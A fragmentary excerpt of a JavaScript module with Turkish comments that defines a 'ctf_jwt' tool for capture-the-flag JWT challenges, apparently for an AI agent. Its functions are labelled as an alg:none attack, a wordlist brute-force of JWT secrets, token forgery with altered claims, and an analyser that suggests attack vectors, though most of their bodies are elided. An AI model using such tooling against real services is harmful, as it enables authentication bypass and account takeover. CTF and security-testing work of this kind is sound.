...
// ─── alg:none Saldırı ───────────────────────────────────────────────────────
export function algNoneAttack(token, claimOverrides) {
...
function hmacSha(algo, secret, data) {
    return b64urlEncode(createHmac(algo, secret).update(data).digest());
}
export async function bruteForceJwtSecret(token, maxAttempts = 100_000) {
    const parsed = decodeJwt(token);
    if (!parsed.ok) {
        return { ok: false, cracked: null, attempts: 0, wordlist: '', alg: 'unknown', notes: [parsed.error ?? 'decode fail'] };
    }
    const alg = String(parsed.header.alg ?? 'unknown').toLowerCase();
...
export function forgeJwt(secret, claimOverrides, originalToken, alg = 'HS256') {
    const algoMap = { HS256: 'sha256', HS384: 'sha384', HS512: 'sha512' };
    const algoName = algoMap[alg];
...
function analyzeJwt(token) {
    const parsed = decodeJwt(token);
    if (!parsed.ok || !parsed.header)
        return [parsed.error ?? 'decode fail'];
    const notes = [];
...
// ─── Tool Tanımı ─────────────────────────────────────────────────────────────
export const ctfJwtTool = {
    name: 'ctf_jwt',
    description: 'CTF JWT toolkit. Eylemler: decode (header+payload göster), analyze (saldırı vektörleri öner), ' +
    ...
    async execute(input) {
        ...
        if (!token)
            return { output: 'token gerekli', isError: true };
        switch (action) {
            case 'decode': {
                const r = decodeJwt(token);
                if (!r.ok)
                    return { output: `Hata: ${r.error}`, isError: true };
                return {
                    output: [
                        '┌─ JWT DECODE ────────────────────────────────────────────────┐',
                        'HEADER:',
            ...
            case 'brute': {
                ...
                if (r.cracked)
                    lines.push(`│ 🎯 SECRET: ${r.cracked}`);
                else
                    lines.push(`│ ✗ Bulunamadı`);
                lines.push('└─────────────────────────────────────────────────────────────┘');
            ...
            case 'forge': {
                ...
                if (!secret)
                    return { output: 'forge için secret gerekli', isError: true };
                const claims = (input['claims'] ?? {});
                const alg = String(input['alg'] ?? 'HS256');
